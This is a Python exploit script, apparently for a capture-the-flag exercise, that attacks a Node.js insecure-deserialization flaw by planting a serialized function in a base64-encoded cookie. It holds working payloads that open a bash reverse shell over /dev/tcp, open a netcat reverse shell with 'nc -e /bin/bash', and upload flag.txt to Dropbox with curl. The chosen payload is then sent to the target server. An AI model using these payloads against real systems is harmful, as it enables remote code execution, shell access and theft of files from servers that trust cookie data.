import requests
import base64
import re,sys
import json

url = 'http://localhost:3000/guest'

# test_string = '''{"rce":"_$$ND_FUNC$$_function (){require(`child_process`).exec(`echo \\"hey\\"`, function(error, stdout, stderr) { console.log(stdout);console.log(stderr) });}()"}'''

bash_shell = '''{"rce":"_$$ND_FUNC$$_function(){ require(`child_process`).exec(`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`, function(error, stdout, stderr) { console.log(stdout);console.log(stderr);});}()"}'''

nc_shell = '''{"rce":"_$$ND_FUNC$$_function(){ require(`child_process`).exec(`nc -e /bin/bash 10.0.0.1 4242`, function(error, stdout, stderr) { console.log(stdout);console.log(stderr);});}()"}'''


'''
curl command will get deserialized first
This will be the result after javascript convert base64 decoded data to string,
curl -X POST https://content.dropboxapi.com/2/files/upload --header \\\"Authorization: Bearer <ACCESS_TOKEN>\\\" --header \\\"Dropbox-API-Arg: {\\\\\"path\\\\\": \\\\\"/flag.txt\\\\\"}\\\" --header \\\"Content-Type: application/octet-stream\\\" --data-binary @flag.txt

This should be the json data for deserialization--> 
curl -X POST https://content.dropboxapi.com/2/files/upload --header \"Authorization: Bearer <ACCESS_TOKEN>\" --header \"Dropbox-API-Arg: {\\"path\\": \\"/flag.txt\\"}\" --header \"Content-Type: application/octet-stream\" --data-binary @flag.txt
'''

curl_send_file = '''{"rce":"_$$ND_FUNC$$_function(){ require(`child_process`).exec(`curl -X POST https://content.dropboxapi.com/2/files/upload --header \\\\\\"Authorization: Bearer <ACCESS_TOKEN>\\\\\\" --header \\\\\\"Dropbox-API-Arg: {\\\\\\\\\\"path\\\\\\\\\\": \\\\\\\\\\"/flag.txt\\\\\\\\\\"}\\\\\\" --header \\\\\\"Content-Type: application/octet-stream\\\\\\" --data-binary @flag.txt`, function(error, stdout, stderr) { console.log(stdout);console.log(stderr);});}()"}'''


print(curl_send_file)
''' curl -X POST https://content.dropboxapi.com/2/files/upload --header \\\"Authorization: Bearer <ACCESS_TOKEN>\\\" --header \\\"Dropbox-API-Arg: {\\\\\"path\\\\\": \\\\\"/flag.txt\\\\\"}\\\" --header \\\"Content-Type: application/octet-stream\\\" --data-binary @flag.txt  '''


cookie = {'cookie_name':base64.b64encode(curl_send_file.encode()).decode()} #change cookie name

try:
    response = requests.post(url, cookies=cookie).text
    print(response)
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)